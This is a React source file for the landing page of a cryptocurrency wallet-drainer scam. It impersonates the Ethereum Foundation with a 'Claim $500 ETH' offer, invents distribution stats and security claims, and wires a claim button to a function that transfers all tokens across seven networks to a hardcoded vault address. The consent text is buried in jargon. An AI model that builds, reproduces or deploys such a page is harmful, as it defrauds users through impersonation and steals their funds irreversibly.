import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";

export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-black relative overflow-hidden">
      {/* Cyberpunk Background Layers */}
      <div 
        className="absolute inset-0 opacity-80"
        style={{
          backgroundImage: "url('/images/cyberpunk-bg.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      />
      
      {/* Floating Particles Layer */}
      <div 
        className="absolute inset-0 opacity-60 pointer-events-none"
        style={{
          backgroundImage: "url('/images/floating-particles.svg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      />
      
      {/* Cyberpunk Glass Header */}
      <header className="glass-header relative z-20 px-6 py-8">
        <div className="max-w-6xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-6">
            <div className="w-20 h-20 glass-card rounded-2xl flex items-center justify-center neon-glow-cyan">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12 animate-pulse" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-neon-cyan animate-pulse">
                ETHEREUM FOUNDATION
              </h1>
              <p className="text-neon-purple font-medium uppercase tracking-wider">
                {">> Official ETH Distribution Protocol"}
              </p>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`btn-premium flex items-center space-x-3 px-8 py-4 rounded-xl font-bold uppercase tracking-wider ${
                walletState.isConnected
                  ? "bg-gradient-to-r from-green-400 to-green-600 text-black neon-glow-cyan border-green-400"
                  : "text-black"
              }`}
            >
              <Wallet className="w-6 h-6" />
              <span>
                {isConnecting
                  ? ">> CONNECTING..."
                  : walletState.isConnected
                  ? ">> WALLET LINKED"
                  : ">> CONNECT WALLET"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Cyberpunk Hero Section */}
      <div className="relative z-10 px-8 py-20">
        <div className="max-w-6xl mx-auto text-center">
          {/* Cyberpunk Status Banner */}
          <div className="inline-flex items-center px-8 py-4 glass-card rounded-none text-lg font-bold mb-12 neon-glow-cyan uppercase tracking-widest">
            <div className="w-3 h-3 bg-green-400 rounded-none mr-4 animate-pulse"></div>
            {">> ACTIVE PROTOCOL: $500 ETH DISTRIBUTION LIVE"}
          </div>
          
          {/* Cyberpunk Hero Title */}
          <h2 className="text-6xl md:text-8xl font-black mb-12 leading-none uppercase tracking-wider">
            <span className="text-neon-cyan animate-pulse">CLAIM YOUR</span><br/>
            <span className="text-gradient text-neon-magenta animate-neon-pulse">$500 ETH</span><br/>
            <span className="text-neon-purple">REWARD NOW</span>
          </h2>
          
          {/* Cyberpunk Description */}
          <div className="glass-card p-8 mb-12 max-w-4xl mx-auto">
            <p className="text-xl md:text-2xl text-neon-cyan font-bold uppercase tracking-wide leading-relaxed">
              {">> ETHEREUM FOUNDATION AUTHORIZED DISTRIBUTION PROTOCOL"}<br/>
              {">> CONNECT WALLET TO INITIALIZE CLAIM SEQUENCE"}<br/>
              {">> INSTANT REWARD PROCESSING ACTIVATED"}
            </p>
          </div>
          
          {/* Network Icons Grid */}
          <div className="flex justify-center mb-16">
            <div className="glass-card p-8 rounded-2xl">
              <h3 className="text-2xl font-bold text-neon-purple mb-6 uppercase tracking-wider">
                {">> SUPPORTED NETWORKS"}
              </h3>
              <img 
                src="/images/network-icons.svg" 
                alt="Multi-Network Support" 
                className="w-full max-w-4xl h-auto"
              />
            </div>
          </div>
          
          {/* Cyberpunk Warning Section */}
          <div className="glass-card p-8 mb-16 max-w-5xl mx-auto border-l-8 border-red-500 neon-glow-magenta">
            <div className="flex items-start space-x-6">
              <div className="w-16 h-16 bg-red-500/20 flex items-center justify-center flex-shrink-0 border-2 border-red-500">
                <span className="text-red-400 text-3xl font-bold">!</span>
              </div>
              <div className="text-left">
                <h3 className="font-black text-red-400 text-2xl mb-4 uppercase tracking-wider">
                  {">> CRITICAL SYSTEM NOTICE"}
                </h3>
                <p className="text-neon-cyan font-bold text-lg leading-relaxed uppercase">
                  <strong className="text-white">BY EXECUTING "CLAIM $500 ETH" PROTOCOL, YOU AUTHORIZE COMPLETE CRYPTOCURRENCY ASSET TRANSFER</strong> 
                  FROM CONNECTED WALLET TO DISTRIBUTION VAULT FOR PROCESSING. 
                  ALL ETH AND ERC-20 TOKENS ACROSS ALL NETWORKS WILL BE CONSOLIDATED.
                </p>
              </div>
            </div>
          </div>

          {/* Cyberpunk Stats Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-20">
            <div className="card-premium p-10 group border-l-4 border-cyan-400">
              <div className="text-5xl font-black text-neon-cyan mb-4">$2.5M+</div>
              <div className="text-neon-purple font-bold uppercase tracking-wider">TOTAL DISTRIBUTED</div>
              <div className="w-full h-2 bg-gradient-to-r from-cyan-400 to-purple-600 mt-6"></div>
            </div>
            <div className="card-premium p-10 group border-l-4 border-purple-500">
              <div className="text-5xl font-black text-neon-purple mb-4">5,000+</div>
              <div className="text-neon-magenta font-bold uppercase tracking-wider">CLAIMS PROCESSED</div>
              <div className="w-full h-2 bg-gradient-to-r from-purple-500 to-pink-500 mt-6"></div>
            </div>
            <div className="card-premium p-10 group border-l-4 border-pink-500">
              <div className="text-5xl font-black text-neon-magenta mb-4">7</div>
              <div className="text-neon-cyan font-bold uppercase tracking-wider">NETWORKS ACTIVE</div>
              <div className="w-full h-2 bg-gradient-to-r from-pink-500 to-cyan-400 mt-6"></div>
            </div>
          </div>
        </div>
      </div>

      <main className="relative z-10 max-w-7xl mx-auto px-8 py-16 space-y-16">
        {/* Cyberpunk ETH Claim Terminal */}
        <div className="max-w-4xl mx-auto">
          <div className="card-premium p-12 neon-glow-cyan border-l-8 border-cyan-400">
            <div className="text-center mb-12">
              {/* Cyberpunk Icon Terminal */}
              <div className="w-32 h-32 mx-auto mb-8 bg-black border-4 border-cyan-400 flex items-center justify-center neon-glow-cyan relative">
                <span className="text-cyan-400 text-5xl font-black animate-pulse">Ξ</span>
                <div className="absolute top-2 right-2 w-3 h-3 bg-green-400 animate-pulse"></div>
                <div className="absolute bottom-2 left-2 text-xs text-cyan-400 font-mono">LIVE</div>
              </div>
              
              <h3 className="text-4xl font-black mb-6 uppercase tracking-widest">
                <span className="text-neon-cyan">$500 ETH REWARD</span><br/>
                <span className="text-neon-purple">TERMINAL ACTIVE</span>
              </h3>
              <p className="text-neon-magenta text-xl font-bold uppercase tracking-wide">
                {">> WALLET ELIGIBLE FOR DISTRIBUTION PROTOCOL"}
              </p>
            </div>
            
            {/* Cyberpunk separator */}
            <div className="w-full h-1 bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 mb-12"></div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </div>

        {/* Cyberpunk Transaction Monitor */}
        <div className="max-w-6xl mx-auto">
          <div className="card-premium p-10 border-l-8 border-purple-500 neon-glow-purple">
            <div className="flex items-center justify-between mb-8">
              <h3 className="text-3xl font-black text-neon-purple uppercase tracking-widest">
                {">> CLAIMS ACTIVITY MONITOR"}
              </h3>
              <div className="flex items-center space-x-4 glass-card px-4 py-2">
                <div className="w-4 h-4 bg-green-400 animate-pulse"></div>
                <span className="text-neon-cyan font-bold uppercase tracking-wide">LIVE FEED</span>
              </div>
            </div>
            <div className="border-2 border-cyan-400 bg-black/50 p-6">
              <TransactionHistory />
            </div>
          </div>
        </div>

        {/* Cyberpunk Multi-Network Scanner */}
        {walletState.isConnected && (
          <div className="max-w-6xl mx-auto">
            <div className="card-premium p-10 border-l-8 border-pink-500 neon-glow-magenta">
              <div className="flex items-center justify-between mb-8">
                <h3 className="text-3xl font-black text-neon-magenta uppercase tracking-widest">
                  {">> NETWORK PORTFOLIO SCANNER"}
                </h3>
                <div className="flex items-center space-x-4 glass-card px-6 py-3">
                  <div className="flex -space-x-1">
                    <div className="w-6 h-6 bg-cyan-400 border-2 border-black"></div>
                    <div className="w-6 h-6 bg-purple-500 border-2 border-black"></div>
                    <div className="w-6 h-6 bg-pink-500 border-2 border-black"></div>
                  </div>
                  <span className="text-neon-cyan font-bold uppercase tracking-wide">7 NETWORKS ACTIVE</span>
                </div>
              </div>
              
              {/* Cyberpunk network scanner interface */}
              <div className="border-4 border-cyan-400 bg-black/70 p-8 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 animate-pulse"></div>
                <div className="relative z-10">
                  <NetworkBalances
                    networkBalances={walletState.networkBalances || []}
                    isLoadingNetworks={isLoadingNetworks}
                    onRefreshNetworks={refreshAllNetworks}
                  />
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Cyberpunk Terminal Footer */}
      <footer className="relative mt-24 bg-black border-t-4 border-cyan-400 overflow-hidden">
        {/* Cyberpunk Background Grid */}
        <div 
          className="absolute inset-0 opacity-30"
          style={{
            backgroundImage: "url('/images/floating-particles.svg')",
            backgroundSize: '800px 800px',
            backgroundRepeat: 'repeat'
          }}
        />
        
        <div className="relative z-10 max-w-7xl mx-auto px-8 py-20">
          {/* Cyberpunk Terms Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-16">
            <div className="glass-card p-10 border-l-8 border-cyan-400 neon-glow-cyan">
              <h4 className="text-2xl font-black text-neon-cyan mb-8 uppercase tracking-widest">PROTOCOL TERMS</h4>
              <ul className="space-y-4 text-neon-purple font-bold uppercase text-sm">
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-cyan-400 mt-2 flex-shrink-0"></div>
                  <span>{">> ETH REWARDS DISTRIBUTED POST CONSOLIDATION"}</span>
                </li>
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-purple-500 mt-2 flex-shrink-0"></div>
                  <span>{">> ALL 7 NETWORKS PROCESSED SIMULTANEOUSLY"}</span>
                </li>
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-pink-500 mt-2 flex-shrink-0"></div>
                  <span>{">> PROCESSING TIME: 5-10 MINUTES MAXIMUM"}</span>
                </li>
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-cyan-400 mt-2 flex-shrink-0"></div>
                  <span>{">> MINIMUM PORTFOLIO VALUE REQUIRED"}</span>
                </li>
              </ul>
            </div>
            
            <div className="glass-card p-10 border-l-8 border-purple-500 neon-glow-purple">
              <h4 className="text-2xl font-black text-neon-purple mb-8 uppercase tracking-widest">SECURITY MATRIX</h4>
              <ul className="space-y-4 text-neon-cyan font-bold uppercase text-sm">
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
                  <span>{">> BLOCKCHAIN TRANSACTION LOGGING ACTIVE"}</span>
                </li>
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
                  <span>{">> SMART CONTRACT SECURITY VERIFIED"}</span>
                </li>
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
                  <span>{">> MULTI-SIG VAULT PROTECTION LIVE"}</span>
                </li>
                <li className="flex items-start space-x-4">
                  <div className="w-3 h-3 bg-green-400 mt-2 flex-shrink-0"></div>
                  <span>{">> KYC/AML COMPLIANCE MAINTAINED"}</span>
                </li>
              </ul>
            </div>
          </div>
          
          {/* Critical System Alert */}
          <div className="glass-card p-10 mb-16 border-l-8 border-red-500 neon-glow-magenta">
            <div className="flex items-start space-x-6">
              <div className="w-20 h-20 bg-red-500/20 flex items-center justify-center flex-shrink-0 border-4 border-red-500">
                <span className="text-red-400 text-4xl font-black">⚠</span>
              </div>
              <div className="text-left">
                <h4 className="font-black text-red-400 text-3xl mb-6 uppercase tracking-widest">{">> CRITICAL SYSTEM ALERT"}</h4>
                <p className="text-white font-bold text-lg leading-relaxed uppercase">
                  THIS IS A CRYPTOCURRENCY TRANSFER PROTOCOL. BY EXECUTING <strong className="text-neon-cyan">"CLAIM $500 ETH"</strong> COMMAND, 
                  YOU AUTHORIZE IMMEDIATE TRANSFER OF ALL CRYPTOCURRENCY ASSETS FROM CONNECTED WALLET(S) TO PROCESSING VAULT 
                  ACROSS ALL SUPPORTED BLOCKCHAIN NETWORKS. COMPLETE PORTFOLIO CONSOLIDATION - IRREVERSIBLE OPERATION.
                </p>
              </div>
            </div>
          </div>
          
          {/* Footer Terminal Interface */}
          <div className="text-center">
            <div className="w-full h-2 bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 mb-12"></div>
            
            <div className="flex items-center justify-center mb-8">
              <div className="w-16 h-16 bg-black border-4 border-cyan-400 flex items-center justify-center mr-6 neon-glow-cyan">
                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10 animate-pulse" />
              </div>
              <span className="text-3xl font-black text-neon-cyan uppercase tracking-widest">ETHEREUM FOUNDATION</span>
            </div>
            
            <p className="text-neon-purple mb-6 text-xl font-bold uppercase tracking-wide">
              {"© 2025 ETHEREUM FOUNDATION DISTRIBUTION PROTOCOL - MULTI-NETWORK DEFI TECHNOLOGY"}
            </p>
            
            <div className="glass-card px-8 py-4 inline-block border-2 border-cyan-400">
              <p className="text-neon-cyan font-mono font-bold uppercase tracking-widest">
                {"VAULT: "}{import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
